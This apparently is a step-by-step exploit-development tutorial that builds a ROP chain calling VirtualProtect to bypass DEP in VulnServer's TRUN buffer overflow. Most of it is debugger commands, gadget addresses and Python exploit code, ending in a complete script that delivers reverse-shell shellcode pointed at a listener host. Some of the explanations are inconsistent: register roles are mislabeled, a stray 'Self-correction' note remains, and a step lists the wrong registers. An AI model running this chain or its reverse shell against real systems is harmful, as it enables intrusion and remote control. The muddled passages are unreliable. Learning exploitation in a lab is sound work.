---
title: "VirtualProtect DEP Bypass: Step-By-Step Exploit"
date: "2025-04-08"
tags: ["Exploit Development", "VulnServer", "DEP Bypass", "ROP", "Buffer Overflow", "Windows Exploitation"]
---

# VirtualProtect DEP Bypass: Step-By-Step Exploit

![ROP chain exploitation techniques](/images/dep-bypass.jpeg)

## Introduction

Data Execution Prevention (DEP) has been a game-changer in exploit development. The days of simply overflowing a buffer, jumping to your shellcode, and calling it a day are long gone. DEP enforces a simple rule: memory can be writable OR executable, but not both at the same time.

So what happens when you try to execute shellcode in a classic buffer overflow? DEP detects code execution from a writable memory area and shuts everything down. Game over.

But DEP isn't the impenetrable wall it appears to be. Through the magic of Return-Oriented Programming (ROP), we can leverage existing executable code to call Windows APIs that change memory protections, effectively bypassing DEP.

In this guide, I'll walk you through manually creating a ROP chain to exploit VulnServer's TRUN command vulnerability with DEP enabled. Unlike many tutorials that rely on automated tools, we'll build our exploit piece by piece, understanding each step along the way.

## Prerequisites

- Windows 7/10 (32-bit) with WinDbg or Immunity Debugger with Mona.py. (This guide focuses on the 32-bit architecture).
- VulnServer running on a Windows VM (ensure it's the 32-bit version).
- Python 3 for exploit development
- Basic understanding of vanilla buffer overflows

## 1. Understanding the Vulnerability

Let's start by confirming that DEP is indeed preventing our standard exploit. A typical buffer overflow exploit for VulnServer would look like this:

```python
import struct
import socket

target = ("192.168.0.111", 9999)  # VulnServer

VULNSRVR_CMD = b"TRUN /.:/"
OFFSET = 2003  # Bytes until we reach EIP
JMP_ESP = 0x625011AF  # Address of a JMP ESP instruction

# Shellcode - msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f python -b '\x00'
shellcode = b"SHELLCODE"

payload = VULNSRVR_CMD
payload += b"A" * OFFSET
payload += struct.pack("<I", JMP_ESP)
payload += b"\x90" * 16  # NOP sled
payload += shellcode

with socket.create_connection(target) as sock:
    sock.recv(512)  # Welcome message
    sock.send(payload)
    print("[+] Exploit sent")
```

When we run this with DEP enabled, our exploit fails with an access violation. Checking memory protection in the debugger confirms the issue:

```
!vprot esp
```

Output:
```
BaseAddress:       00b4f000
AllocationBase:    00950000
AllocationProtect: 00000004  PAGE_READWRITE
RegionSize:        00001000
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE
Type:              00020000  MEM_PRIVATE
```

The stack is marked as PAGE_READWRITE (not executable), confirming DEP is active and blocking our shellcode execution.

## 2. Finding the Buffer Overflow Offset

First things first - we need to find exactly where our input overwrites EIP:

1. Generate a cyclic pattern:
```
!py mona pc 3000
```
   
Output:
```

Creating cyclic pattern of 3000 bytes
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7...
   ```

2. Create a script to send this pattern:
```python
pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5..." # Copy from mona output
payload = b"TRUN /.:/" + pattern
```

3. After sending the pattern and crashing the server, find our exact offset:
```
!py mona findmsp -distance 3000
```

Output:
```
[+] Examining registers
 EIP contains normal pattern : 0x396f4338 (offset 2003)
 ESP (0x00ecf9c8) points at offset 2010 in normal pattern (length 984)
 EBP contains normal pattern : 0x6f43376f (offset 2001)
```

We now know our offset to EIP is 2003 bytes.

## 3. Manual Gadget Hunting

This is where the real work begins. To build our ROP chain, we need to find small code snippets ("gadgets") in memory that end with a RET instruction. These will be the building blocks of our DEP bypass.

### 3.1 Finding Base ROP Gadgets

1. First, lets identify non-ASLR modules:
```
!py mona modules
```

Output:

```
0x62500000 | 0x62508000 | 0x00008000 | False  | False   | False | False |  False   | False  | -1.0- [essfunc.dll] (C:\VulnApps\essfunc.dll) 0x0
0x00400000 | 0x00407000 | 0x00007000 | False  | False   | False | False |  False   | False  | -1.0- [vulnserver.exe] (C:\VulnApps\vulnserver.exe) 0x0
```

We'll use essfunc.dll because it's typically compiled without ASLR (Address Space Layout Randomization) and Rebase support in standard VulnServer setups (indicated by 'False' in the ASLR/Rebase columns). This simplifies our focus on the DEP bypass itself. Bypassing ASLR would require additional techniques, such as information leaks to find module base addresses dynamically, which are beyond the scope of this specific guide.


2. Find a simple RET instruction (ROP NOP):
```
!py mona find -type instr -s "ret" -m essfunc -cpb "\x00"
```

Output:
```
0x62501022 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
0x62501057 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
0x625010b6 : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
0x625011ab : ret | {PAGE_EXECUTE_READ} [essfunc.dll]
```
   
We'll use 0x62501022 as our ROP NOP.


3. Find a JMP ESP gadget:
```
!py mona jmp -r esp -m essfunc -cpb "\x00"
```

Output:
```
0x625011AF : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]
0x625011C7 : jmp esp | {PAGE_EXECUTE_READ} [essfunc.dll]
```
   
We'll use 0x625011AF for our JMP ESP gadget later if needed, but the primary one for the final VirtualProtect return will be identified separately (we used 0x625011c7 in the final chain). (Self-correction: Clarified the JMP ESP usage slightly).


### 3.2 Finding System DLL Gadgets

We also need gadgets from system DLLs to complete our chain:

1. Find PUSHAD instruction:
```
!py mona find -type instr -s "pushad # ret" -m "msvcrt,ntdll,kernel32" -cpb "\x00"
```

Output:
```
0x775d6f67 : pushad | ret [msvcrt.dll]
```
2. Find gadgets for setting other registers:
```
!py mona find -type instr -s "xchg eax, edx # ret" -m "ntdll" -cpb "\x00"
```
Output:
```
0x77d9e6c0 : xchg eax, edx | ret | {PAGE_EXECUTE_READ} [ntdll.dll]
```
3. Find gadgets for setting "neg eax, ret" registers:
```
!py mona find -type instr -s "neg eax # ret" -m "kernel32" -cpb "\x00"
```
Output:
```
0x76505808 : neg eax | ret | {PAGE_EXECUTE_READ} [KERNEL32.dll]
```

## 4. Finding VirtualProtect in IAT

To bypass DEP, we'll use Windows' VirtualProtect function to change memory permissions. First, we need to find its address in the Import Address Table (IAT):

1. Examine the IAT and search for VirtualProtect:
```
!dh essfunc -f
```
   
Output:
       
```
 5000 [     197] address [size] of Export Directory
 6000 [     224] address [size] of Import Directory
    0 [       0] address [size] of Resource Directory
    0 [       0] address [size] of Exception Directory
    0 [       0] address [size] of Security Directory
 7000 [      E4] address [size] of Base Relocation Directory
    0 [       0] address [size] of Debug Directory
    0 [       0] address [size] of Description Directory
    0 [       0] address [size] of Special Directory
    0 [       0] address [size] of Thread Storage Directory
    0 [       0] address [size] of Load Configuration Directory
    0 [       0] address [size] of Bound Import Directory
    0 [       0] address [size] of Import Address Table Directory
    0 [       0] address [size] of Delay Import Directory
    0 [       0] address [size] of COR20 Header Directory
    0 [       0] address [size] of Reserved Directory
```

2. Dump the IAT and search for VirtualProtect:
```
dps essfunc+0x6000 L100
```
   
Output:
```
 62506090  764cb3a0 KERNEL32!AddAtomA
 62506094  764cb860 KERNEL32!FindAtomA
 62506098  7650d160 KERNEL32!GetAtomNameA
 6250609c  764d6570 KERNEL32!VirtualProtectStub
 625060a0  764d7b60 KERNEL32!VirtualQueryStub
```

3. Verify this is the correct function:
```
dd 0x6250609c L1
u poi(0x6250609c)
```
   
Output:
    
```
764d6570 8bff            mov     edi,edi
764d6572 55              push    ebp
764d6573 8bec            mov     ebp,esp
764d6575 5d              pop     ebp
764d6576 ff253cb85376    jmp     dword ptr [KERNEL32!_imp__VirtualProtect (7653b83c)]
KERNEL32!AppModelPolicy_GetPolicy_Internal:
764d657c 8bff            mov     edi,edi
764d657e 55              push    ebp
764d657f 8bec            mov     ebp,esp
```

We've confirmed 0x6250609c is the IAT entry for VirtualProtect.


## 5. Finding a Writable Memory Region

For the VirtualProtect call, the lpflOldProtect parameter requires a pointer to a writable memory location. We need to find such a location that is reliable and doesn't contain bad characters in its address. We can inspect the memory layout of loaded modules, like KERNEL32.DLL, to find writable sections.


1. First, find the base address of KERNEL32.DLL:

```
lm vm kernel32
```

Output
``` 
start    end        module name
764c0000 765b0000   kernel32   (deferred)
```

So, the base address is 0x764c0000.

2. Now, examine the PE header of KERNEL32.DLL to find its sections:

```
!dh 0x764c0000
```

Scroll through the output looking for the "SECTION HEADER" information. You are looking for a section with "Write" permissions (often .data).

```
[...]
SECTION HEADER #6
   .data name
  5AF4 virtual size
 7A000 virtual address (RVA)
  5C00 size of raw data
 78C00 file pointer to raw data
     0 file pointer to relocation table
     0 file pointer to line numbers
     0 number of relocations
     0 number of line numbers
40000040 flags
         Initialized Data
         Read Write  <-- Writable permissions!
[...]
```
3. Identify a writable section. The .data section looks promising:
- It has Read Write permissions.
- Its Relative Virtual Address (RVA) is 0x7a000.

4. Calculate the absolute start address of the .data section:

```
? <base_address> + <RVA>
? 0x764c0000 + 0x7a000
```

Output:
```
Evaluate expression: 1985187840 = 7653a000
```

5. Choose an address within this writable section. We need an address suitable for lpflOldProtect. Let's use 0x7653a3c1, which is used later in the ROP chain. This address is calculated as 0x7653a000 + 0x3c1. Since 0x3c1 is less than the section size (0x5af4), this address lies within the writable .data section.




6. Verify the chosen address 0x7653a3c1 has the expected permissions:

```
!vprot 0x7653a3c1
```

Output:
```
BaseAddress:       7653a000
AllocationBase:    764c0000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        00006000  // Note: RegionSize might cover more than just .data
State:             00001000  MEM_COMMIT
Protect:           00000004  PAGE_READWRITE  <-- Confirmed Writable
Type:              01000000  MEM_IMAGE
```
 
We have successfully identified 0x7653a3c1 within KERNEL32.DLL's .data section as a suitable writable address using PE header inspection. We will use this address for the lpflOldProtect parameter.



## 6. Building Register Setup for VirtualProtect

Now we'll build our ROP chain to call VirtualProtect. Here's the function prototype:

```
BOOL VirtualProtect(
  LPVOID lpAddress,      // [ESP+4]  (Memory address to modify)
  SIZE_T dwSize,         // [ESP+8]  (Size of region)
  DWORD flNewProtect,    // [ESP+12] (Memory protection flag)
  PDWORD lpflOldProtect  // [ESP+16] (Pointer to store old protection)
);
```

When we use PUSHAD, the registers are pushed in this order: EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI.

These values will map to VirtualProtect's parameters as follows:

```
BOOL VirtualProtect(
  LPVOID lpAddress,      // ECX -> [ESP+4]  (Address of shellcode)
  SIZE_T dwSize,         // EDX -> [ESP+8]  (Size of region to make executable)
  DWORD flNewProtect,    // EBX -> [ESP+C]  (PAGE_EXECUTE_READWRITE 0x40)
  PDWORD lpflOldProtect  // ESP+8 -> [ESP+10] (Writable memory address)
);
```

Let's build our ROP chain, setting up each register with the right value:

### 6.1 Setting up EBP (Stack Alignment)

```python
# EBP - Used for stack pivot or alignment
ebp = struct.pack("<I", 0x775d8836)  # POP EBP # RETN [msvcrt.dll]
ebp += struct.pack("<I", 0x775d8836)  # skip 4 bytes [msvcrt.dll]
```

**Current Value**: 0x775d8836 (same as gadget address)
**Reason**: This serves as a placeholder and helps with stack alignment. Using the same address helps maintain predictable stack behavior.

**How we found it**:
```
!py mona find -type instr -s "pop ebp # ret" -m "msvcrt" -cpb "\x00"
```

**Alternative Options**:
1. **Use JMP ESP directly**:
```python
ebp = struct.pack("<I", 0x775d8836)  # pop ebp; ret
ebp += struct.pack("<I", 0x625011af)  # jmp esp
```

2. **Other module address**:
```python
ebp = struct.pack("<I", 0x76fa54a3)  # pop ebp; ret [KERNEL32.dll]
ebp += struct.pack("<I", 0x76fa54a3)  # same address
```

### 6.2 Setting up EBX (flNewProtect parameter)

```python
# EBX - Size parameter (0x201)
ebx = struct.pack("<I", 0x75f366b4)  # POP EAX # RETN [KERNELBASE.dll]
ebx += struct.pack("<I", 0xfffffdff)  # Value to negate, will become 0x00000201
ebx += struct.pack("<I", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL]
ebx += struct.pack("<I", 0x77597926)  # XCHG EAX,EBX # RETN [msvcrt.dll]
```

**Current Value**: 0x201 (Size of region to protect)
**Reason**: This needs to be large enough to cover our shellcode (513 bytes).

**How we calculated it**: Using negation technique to avoid null bytes:
1. Load EAX with 0xfffffdff (value to negate, will become 0x00000201)
2. Negate EAX to get 0x201
3. Exchange EAX and EBX

**How we found these gadgets**:
```
!py mona find -type instr -s "pop eax" -m "kernelbase" -cpb "\x00"
!py mona find -type instr -s "neg eax" -m "kernel32" -cpb "\x00"
!py mona find -type instr -s "xchg eax, ebx" -m "msvcrt" -cpb "\x00"
```

**Alternative Options**:
1. **Adding from zero**:
```python
ebx = struct.pack("<I", 0x77cef70e)  # xor eax, eax; ret
ebx += struct.pack("<I", 0x775b3084)  # add eax, 0x100; ret
ebx += struct.pack("<I", 0x775b3084)  # add eax, 0x100; ret
ebx += struct.pack("<I", 0x775b616f)  # add eax, 8; ret
ebx += struct.pack("<I", 0x77597926)  # xchg eax, ebx; ret
```

2. **Different size value**:
```python
ebx = struct.pack("<I", 0x75f366b4)  # pop eax; ret
ebx += struct.pack("<I", 0xfffffeff)  # -0x101 (smaller region)
ebx += struct.pack("<I", 0x76505808)  # neg eax; ret
ebx += struct.pack("<I", 0x77597926)  # xchg eax, ebx; ret
```

### 6.3 Setting up EDX (dwSize parameter)

```python
# EDX - Protection flag (0x40)
edx = struct.pack("<I", 0x75d91838)  # POP EAX # RETN [KERNELBASE.dll]
edx += struct.pack("<I", 0xffffffc0)  # Value to negate, will become 0x00000040
edx += struct.pack("<I", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL]
edx += struct.pack("<I", 0x77d9e6c0)  # XCHG EAX,EDX # RETN [ntdll.dll]
```

**Current Value**: 0x40 (PAGE_EXECUTE_READWRITE)
**Reason**: This is the memory protection flag to make our shellcode executable.

**How we calculated it**: Using negation to avoid null bytes:
1. Load EAX with 0xffffffc0 (value to negate, will become 0x00000040)
2. Negate EAX to get 0x40
3. Exchange EAX and EDX

**How we found these gadgets**:
```
!py mona find -type instr -s "pop eax" -m "kernelbase" -cpb "\x00"
!py mona find -type instr -s "neg eax" -m "kernel32" -cpb "\x00"
!py mona find -type instr -s "xchg eax, edx" -m "ntdll" -cpb "\x00"
```

**Alternative Options**:
1. **Direct POP**:
```python
edx = struct.pack("<I", 0x77e4b949)  # pop edx; ret
edx += struct.pack("<I", 0x00000040)  # PAGE_EXECUTE_READWRITE
```

2. **Arithmetic with other constants**:
```python
edx = struct.pack("<I", 0x77cef70e)  # xor eax, eax; ret
edx += struct.pack("<I", 0x775a5f04)  # add eax, 0x20; ret
edx += struct.pack("<I", 0x775a5f04)  # add eax, 0x20; ret
edx += struct.pack("<I", 0x77d9e6c0)  # xchg eax, edx; ret
```

### 6.4 Setting up ECX (lpAddress parameter)

```python
ecx = struct.pack("<I", 0x775f94ee)  # POP ECX # RETN [msvcrt.dll]
ecx += struct.pack("<I", 0x7653a3c1)  # &Writable location [KERNEL32.DLL]
```

**Current Value**: 0x7653a3c1 (Writable memory address in KERNEL32.DLL)
**Reason**: This register needs to hold the pointer to a writable memory location (lpflOldProtect parameter) where VirtualProtect can store the old memory protection flags.

**How we found it**: We identified a suitable writable address within KERNEL32.DLL's .data in Section 5.

**How we found the gadget**:

```
!py mona find -type instr -s "pop ecx # ret" -m "msvcrt" -cpb "\x00"
```

**Alternative Options**:

1. **Using essfunc.dll's writable memory**:
```python
ecx = struct.pack("<I", 0x775f94ee)  # pop ecx; ret
ecx += struct.pack("<I", 0x62506228)  # Writable memory in essfunc.dll
```

2. **Stack Address**:
```python
# Use the current ESP value plus an offset
ecx = struct.pack("<I", 0x77c3f1a4)  # mov ecx, esp; add ecx, 0x10; ret
```
Stack Address (More complex): Technique exist to calculate and use an address on the stack itself, but require careful offset management.


### 6.5 Setting up EDI (ROP NOP)

```python
# EDI - Return address (ROP NOP)
edi = struct.pack("<I", 0x76fe83f7)  # POP EDI # RETN [WS2_32.DLL]
edi += struct.pack("<I", 0x7650580a)  # RETN (ROP NOP) [KERNEL32.DLL]
```

**Current Value**: 0x7650580a (RET instruction)
**Reason**: EDI isn't used directly in the VirtualProtect call, but it needs a valid address. A simple RET instruction works as a placeholder.

**How we found it**:
```
!py mona find -type instr -s "pop edi" -m "ws2_32" -cpb "\x00"
!py mona find -type instr -s "ret" -m kernel32 -cpb "\x00"
```

**Alternative Options**:
1. **Any harmless gadget**:
```python
edi = struct.pack("<I", 0x76fe83f7)  # pop edi; ret
edi += struct.pack("<I", 0x90909090)  # NOP values
```

2. **Secondary return address**:
```python
edi = struct.pack("<I", 0x76fe83f7)  # pop edi; ret
edi += struct.pack("<I", 0x625011c7)  # Alternative JMP ESP
```

### 6.6 Setting up ESI (JMP [EAX])

```python
# ESI - Pointer to JMP [EAX] gadget
esi = struct.pack("<I", 0x76525760)  # POP ESI # RETN [KERNEL32.DLL]
esi += struct.pack("<I", 0x75e95833)  # JMP [EAX] [KERNELBASE.dll]
```

**Current Value**: 0x75e95833 (JMP [EAX] instruction)
**Reason**: This technique is crucial for our exploit. After PUSHAD, execution continues at the address in ESI. This gadget will jump to the address pointed to by EAX (which we'll set to VirtualProtect).

**How we found it**:
```
!py mona find -type instr -s "pop esi" -m "kernel32" -cpb "\x00"
!py mona find -type instr -s "jmp dword ptr [eax]" -m "kernelbase" -cpb "\x00"
```

**Alternative Options**:
1. **CALL [EAX] instead of JMP**:
```python
esi = struct.pack("<I", 0x76525760)  # pop esi; ret
esi += struct.pack("<I", 0x75e9583b)  # call dword ptr [eax]; ret
```

2. **Direct IAT pointer technique**:
```python
esi = struct.pack("<I", 0x76525760)  # pop esi; ret
esi += struct.pack("<I", 0x6250609c)  # VirtualProtect IAT
```

### 6.7 Setting up EAX (VirtualProtect pointer)

```python
# EAX - Point to VirtualProtect
eax = struct.pack("<I", 0x75ee5082)  # POP EAX # RETN [KERNELBASE.dll]
eax += struct.pack("<I", 0x6250609c)  # ptr to &VirtualProtect() [IAT essfunc.dll]
```

**Current Value**: 0x6250609c (VirtualProtect IAT entry)

**Reason**: When ESI (which contains JMP [EAX]) executes, it will jump to the address pointed to by EAX, which is VirtualProtect in the IAT.

**How we found the gadget**:
```
!py mona find -type instr -s "pop eax" -m "kernelbase" -cpb "\x00"
```

**How we found the IAT entry**:
```
!dh essfunc -f
dps essfunc+0x6000 L100
```

**Alternative Options**:
1. **MOV EAX technique**:
```python
eax = struct.pack("<I", 0x75f10ada)  # mov eax, 0x6250609c; ret
```

2. **Arithmetic calculation**:
```python
eax = struct.pack("<I", 0x77cef70e)  # xor eax, eax; ret
eax += struct.pack("<I", 0x75ee0982)  # add eax, 0x6250609c; ret
```

### 6.8 Using PUSHAD to call VirtualProtect

```python
# PUSHAD to call VirtualProtect
pushad = struct.pack("<I", 0x775d6f67)  # PUSHAD # RETN [msvcrt.dll]
```

**Current Value**: 0x775d6f67 (PUSHAD; RET instruction)
**Reason**: PUSHAD pushes all 8 general-purpose registers onto the stack in a specific order, setting up the parameter stack for VirtualProtect.

**How we found it**:
```
!py mona find -type instr -s "pushad # ret" -m "msvcrt" -cpb "\x00"
```

**Alternative Options**:
1. **PUSHAD from another module**:
```python
pushad = struct.pack("<I", 0x76081981)  # pushad; ret [KERNEL32.dll]
```

2. **Manual parameter pushing (more complex)**:
```python
# Instead of PUSHAD, manually push each parameter
# Note: This approach is much longer and more complex
manual_push = struct.pack("<I", 0x77cdeedf)  # pop edi; ret
manual_push += struct.pack("<I", 0x6250609c)  # VirtualProtect IAT
manual_push += struct.pack("<I", 0x7654321a)  # push edi; ret
# ... More pushes for each parameter
```

### 6.9 JMP ESP Gadget

```python
# JMP ESP gadget for shellcode execution
jmp_esp = struct.pack("<I", 0x625011c7)  # ptr to 'jmp esp' [essfunc.dll]
```

**Current Value**: 0x625011c7 (JMP ESP instruction)
**Reason**: This is where VirtualProtect will return after execution. It jumps to the shellcode on the stack.

**How we found it**:
```
!py mona jmp -r esp -m essfunc -cpb "\x00"
```

**Alternative Options**:
1. **CALL ESP**:
```python
jmp_esp = struct.pack("<I", 0x62501205)  # call esp
```

2. **PUSH ESP / RET**:
```python
jmp_esp = struct.pack("<I", 0x625013df)  # push esp; ret
```

## 7. Complete Exploit Code

Let's put everything together:

```python
#!/usr/bin/python
import struct
import socket

TARGET_IP = "192.168.0.112"
TARGET_PORT = 9999
target = (TARGET_IP, TARGET_PORT)

VULNSRVR_CMD = b"TRUN /.:/"
TOTAL_BUFFER_LEN = 6000
OFFSET = 2003

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.10 LPORT=4444 -f python -b '\x00'
buf =  b"" # Shellcode generated by msfvenom - full bytes omitted for brevity
...

# Build the final ROP chain
rop = b""
# EBP - Stack pivot setup (using POP EBP # RETN as placeholder/alignment)
rop += struct.pack("<I", 0x775d8836)  # POP EBP # RETN [msvcrt.dll]
rop += struct.pack("<I", 0x775d8836)  # Value for EBP (can be anything, using gadget address)
# EBX - Setup Size parameter (0x201) for VirtualProtect
rop += struct.pack("<I", 0x75f366b4)  # POP EAX # RETN [KERNELBASE.dll]
rop += struct.pack("<I", 0xfffffdff)  # Load -0x201 into EAX
rop += struct.pack("<I", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL] (EAX = 0x201)
rop += struct.pack("<I", 0x77597926)  # XCHG EAX,EBX # RETN [msvcrt.dll] (EBX = 0x201)
# EDX - Setup Protection flag (0x40) for VirtualProtect
rop += struct.pack("<I", 0x75d91838)  # POP EAX # RETN [KERNELBASE.dll]
rop += struct.pack("<I", 0xffffffc0)  # Load -0x40 into EAX
rop += struct.pack("<I", 0x76505808)  # NEG EAX # RETN [KERNEL32.DLL] (EAX = 0x40)
rop += struct.pack("<I", 0x77d9e6c0)  # XCHG EAX,EDX # RETN [ntdll.dll] (EDX = 0x40)
# ECX - Setup lpflOldProtect parameter for VirtualProtect
rop += struct.pack("<I", 0x775f94ee)  # POP ECX # RETN [msvcrt.dll]
rop += struct.pack("<I", 0x7653a3c1)  # &Writable location [KERNEL32.DLL] (ECX = ptr)
# EDI - Setup Return Address (used as ROP NOP here)
rop += struct.pack("<I", 0x76fe83f7)  # POP EDI # RETN [WS2_32.DLL]
rop += struct.pack("<I", 0x7650580a)  # RETN (ROP NOP) [KERNEL32.DLL]
# ESI - Setup Pointer to JMP [EAX] gadget (used after PUSHAD)
rop += struct.pack("<I", 0x76525760)  # POP ESI # RETN [KERNEL32.DLL]
rop += struct.pack("<I", 0x75e95833)  # JMP [EAX] [KERNELBASE.dll]
# EAX - Setup Pointer to VirtualProtect IAT entry
rop += struct.pack("<I", 0x75ee5082)  # POP EAX # RETN [KERNELBASE.dll]
rop += struct.pack("<I", 0x6250609c)  # ptr to &VirtualProtect() [IAT essfunc.dll]
# PUSHAD - Push registers to stack for VirtualProtect call
rop += struct.pack("<I", 0x775d6f67)  # PUSHAD # RETN [msvcrt.dll]
# JMP ESP - Return address after VirtualProtect, jumps to shellcode
rop += struct.pack("<I", 0x625011c7)  # ptr to 'jmp esp' [essfunc.dll]

# Add NOP sled and shellcode
nop = b"\x90" * 16
final_rop = rop + nop + buf # Note: Place shellcode 'buf' after NOPs

# Build the final payload
payload = VULNSRVR_CMD
payload += b"A" * OFFSET
payload += final_rop # Use the ROP chain including NOPs and shellcode
payload += b"C" * (TOTAL_BUFFER_LEN - len(payload)) # Padding

# Send the exploit
with socket.create_connection(target) as sock:
    sock.recv(512)  # Welcome message
    sent = sock.send(payload)
    print(f"sent {sent} bytes")
    print("[x] Exploit sent")
```

## 8. Understanding How the Exploit Works

This exploit uses a `JMP [EAX]` technique combined with `PUSHAD` to call `VirtualProtect` and make our shellcode executable:

1. The initial buffer fills memory until it overwrites the saved `EIP` register at the `2003` byte offset.
2. EIP is overwritten with the address of the first gadget in our ROP chain (e.g., the `POP EBP` gadget used for alignment/setup).
3. The ROP chain executes sequentially: Gadgets pop values into `EBP`, `EBX`, `EDX`, `EBX`, `ESP`, `EBP`, `ESI`, `EDI`, setting them up according to our plan.
4. Crucially, just before `PUSHAD`:
- `EAX` holds the address of the VirtualProtect IAT pointer (`0x6250609c`).
- `ESI` holds the address of a `JMP DWORD PTR [EAX]` gadget (`0x75e95833`).
- `EBX`, `EDX`, `ECX` hold the required parameters for `VirtualProtect` (`dwSize`, `flNewProtect`, `lpflOldProtect`).
- `EDI` and `EBP` hold placeholders or `ROP NOP`s.
5. The `PUSHAD` instruction (`0x775d6f67`) executes. It pushes the current values of `EAX`, `ECX`, `EDX`, `EBX`, `ESP` (original value before `PUSHAD`), `EBP`, `ESI`, `EDI` onto the stack. This arranges the parameters needed by `VirtualProtect` at known offsets from the current stack pointer `ESP`.
6. The `RETN` instruction that is part of the `PUSHAD # RETN` gadget executes. It pops the next value from the stack into `EIP`. Crucially, the way the ROP chain is constructed and aligned means this value popped is the address we loaded into `ESI` (`0x75e95833`, the address of the `JMP DWORD PTR [EAX]` gadget). (Assuming the intended technique works as described).
7. Execution jumps to the `JMP DWORD PTR [EAX]` gadget.
8. This gadget then jumps to the address currently stored in `EAX`, which is the address of the `VirtualProtect` IAT entry (`0x6250609c`).
9. `VirtualProtect` executes. It finds its parameters on the stack where `PUSHAD` placed them. The `lpAddress` parameter (effectively the stack pointer `ESP` where the shellcode lies after the ROP chain arguments) indicates the memory to modify, `dwSize` is `0x201` (from `EBX` via stack), `flNewProtect` is `0x40` (from `EDX` via stack), and `lpflOldProtect` points to the writable KERNEL32 address (from `ECX` via stack). `VirtualProtect` makes the shellcode memory region executable.
10. `VirtualProtect` finishes and executes its own `RET` instruction. The return address on the stack at this point is the one originally placed after the `PUSHAD # RETN` gadget sequence in our main ROP chain: the address of our `JMP ESP` gadget (`0x625011c7`).
11. The `JMP ESP` gadget executes, transferring control directly to the `NOP` sled and then the shellcode located immediately following it on the stack.
12. Our shellcode executes, creating a reverse shell (or performing its intended action).

## 9. Tips and Troubleshooting

1. Always verify gadgets in the debugger to ensure they do exactly what you expect.

2. Make sure your gadget addresses don't contain any bad characters (like \x00 in our case).

3. Be aware of gadgets that affect multiple registers. For example, our "pop ecx" gadget also pops EDX.

4. The PUSHAD technique requires careful stack alignment. Make sure the stack values are in the right order for VirtualProtect parameters.

5. Use breakpoints liberally and check register values at each step to identify issues.

6. If one approach doesn't work, try another. ROP chain development often requires creativity.

## Conclusion

Bypassing DEP might seem daunting at first, but with a methodical approach and understanding of ROP chains, it becomes a manageable challenge. By carefully selecting gadgets and leveraging Windows APIs like VirtualProtect, we can overcome even sophisticated memory protections.

What's particularly elegant about this technique is how we're using the operating system's own APIs against it. Instead of trying to break DEP, we're simply asking Windows nicely to change the memory protection for us.

Remember that while this technique works reliably for bypassing DEP, modern exploit mitigations rarely exist in isolation. Real-world targets often combine DEP with ASLR, CFG, and other protections that require additional bypass techniques.

The most important takeaway from this exercise isn't just the specific VirtualProtect technique, but the methodology for manually building and understanding ROP chains. By mastering these fundamentals, you'll be well-equipped to tackle even more complex exploitation scenarios.

Happy Overflowing! 

---

*Disclaimer: This article is provided for educational purposes only. The techniques described should only be used in authorized environments and security research contexts. Always follow responsible disclosure practices and operate within legal and ethical boundaries.*
